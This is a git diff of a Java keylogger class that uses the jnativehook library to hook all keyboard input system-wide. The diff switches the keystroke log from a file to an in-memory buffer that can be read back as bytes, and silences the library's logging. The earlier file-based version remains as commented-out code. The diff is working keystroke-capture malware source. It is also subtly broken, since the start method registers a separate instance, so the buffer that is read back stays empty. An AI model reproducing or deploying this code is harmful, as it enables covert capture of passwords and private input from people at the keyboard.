@@ -1,34 +1,36 @@
 package com.isee.elfi;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
-import java.io.BufferedWriter;
-import java.io.FileWriter;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.nio.charset.StandardCharsets;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
 public class KeyLogger implements NativeKeyListener {
 
-    private BufferedWriter writer;
+    private final ByteArrayOutputStream logStream;
 
     public KeyLogger() {
-        try {
-            writer = new BufferedWriter(new FileWriter("resources/keylog.txt", true)); // Log dosyasını aç
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        // Initialize the in-memory stream for logs
+        logStream = new ByteArrayOutputStream();
+
+        // Suppress verbose logging from jnativehook
+        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.OFF);
+        logger.setUseParentHandlers(false);
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
         try {
-            // Tuş basıldığında log dosyasına yaz
-            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
-            writer.newLine(); // Yeni bir satıra geç
-            writer.flush(); // Değişiklikleri kaydet
+            // Capture the key text and write to the in-memory log
+            String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
+            logStream.write((keyText + System.lineSeparator()).getBytes(StandardCharsets.UTF_8));
         } catch (IOException ex) {
             ex.printStackTrace();
         }
@@ -36,25 +38,96 @@ public class KeyLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
-        // Tuş serbest bırakıldığında yapılacak işlemler (şu an boş)
+        // Optional: Handle key release events
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
-        // Tuş yazıldığında yapılacak işlemler (şu an boş)
+        // Optional: Handle key typed events
     }
 
-    public static void startKeylogger() {
+    public byte[] getLogAsBytes() {
+        // Retrieve the log as a byte array
+        return logStream.toByteArray();
+    }
+
+    public void stopKeyLogger() {
         try {
-            GlobalScreen.registerNativeHook(); // Global hook kaydı
-            GlobalScreen.addNativeKeyListener(new KeyLogger()); // Dinleyici ekle
+            logStream.close();
+            GlobalScreen.unregisterNativeHook();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    public static void main(String[] args) {
-        // Logger'ı başlat
-        startKeylogger();
+    public void startKeyLogger() {
+        try {
+            // Register the global native hook
+            GlobalScreen.registerNativeHook();
+
+            // Add the key logger as a native key listener
+            GlobalScreen.addNativeKeyListener(new KeyLogger());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
+
+//import com.github.kwhat.jnativehook.GlobalScreen;
+//import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+//import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+//
+//import java.io.BufferedWriter;
+//import java.io.FileWriter;
+//import java.io.IOException;
+//import java.util.logging.Level;
+//import java.util.logging.Logger;
+//
+//public class KeyLogger implements NativeKeyListener {
+//
+//    private BufferedWriter writer;
+//
+//    public KeyLogger() {
+//        try {
+//            writer = new BufferedWriter(new FileWriter("resources/keylog.txt", true)); // Log dosyasını aç
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        }
+//    }
+//
+//    @Override
+//    public void nativeKeyPressed(NativeKeyEvent e) {
+//        try {
+//            // Tuş basıldığında log dosyasına yaz
+//            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
+//            writer.newLine(); // Yeni bir satıra geç
+//            writer.flush(); // Değişiklikleri kaydet
+//        } catch (IOException ex) {
+//            ex.printStackTrace();
+//        }
+//    }
+//
+//    @Override
+//    public void nativeKeyReleased(NativeKeyEvent e) {
+//        // Tuş serbest bırakıldığında yapılacak işlemler (şu an boş)
+//    }
+//
+//    @Override
+//    public void nativeKeyTyped(NativeKeyEvent e) {
+//        // Tuş yazıldığında yapılacak işlemler (şu an boş)
+//    }
+//
+//    public static void startKeylogger() {
+//        try {
+//            GlobalScreen.registerNativeHook(); // Global hook kaydı
+//            GlobalScreen.addNativeKeyListener(new KeyLogger()); // Dinleyici ekle
+//        } catch (Exception e) {
+//            e.printStackTrace();
+//        }
+//    }
+//
+//    public static void main(String[] args) {
+//        // Logger'ı başlat
+//        startKeylogger();
+//    }
+//}
